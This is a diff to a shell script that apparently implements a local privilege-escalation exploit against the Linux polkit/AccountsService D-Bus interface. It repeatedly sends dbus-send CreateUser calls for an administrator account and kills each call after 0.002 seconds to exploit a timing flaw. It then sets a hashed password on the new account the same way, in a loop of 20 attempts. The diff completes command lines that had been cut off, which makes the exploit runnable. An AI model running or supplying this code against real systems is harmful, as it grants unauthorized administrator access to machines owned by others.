@@ -18,7 +18,7 @@ echo "Use CTRL+C to abort the operation."
 while true
 do
         #Run the command that attempts to add a user account.
-        dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$Username strin>
+        dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$Username string:$Fullname int32:1 & sleep 0.002s ; kill $!
 
         #Fill a variable with all users presents in passwd.
         Userlist=$(awk -F: '{print $1}' /etc/passwd)
@@ -45,7 +45,7 @@ Hashedpassword=$(openssl passwd -5 $Password)
 #Try to run the command 20 times to be safe.
 for i in {1..20}
 do
-        dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/$Userid org.freedesktop.Accounts.User.SetPassword string:$>
+        dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/$Userid org.freedesktop.Accounts.User.SetPassword string:$Hashedpassword string:empty & sleep 0.002s ; kill $!
 done
 
 echo "Done!"
